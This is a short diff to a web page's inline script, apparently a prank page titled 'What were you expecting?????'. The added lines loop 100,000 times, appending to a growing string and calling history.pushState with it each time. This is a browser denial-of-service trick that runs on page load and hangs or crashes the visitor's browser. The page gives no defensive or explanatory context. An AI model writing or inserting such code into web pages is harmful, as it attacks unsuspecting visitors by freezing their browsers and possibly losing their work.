@@ -102,7 +102,11 @@ pageTracker._trackPageview();
       document.write("1 ");
       sleep(1000);
       document.write("\<title\>What were you expecting?????\<\/title\>");
-      
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
     </script>
   </head>
   
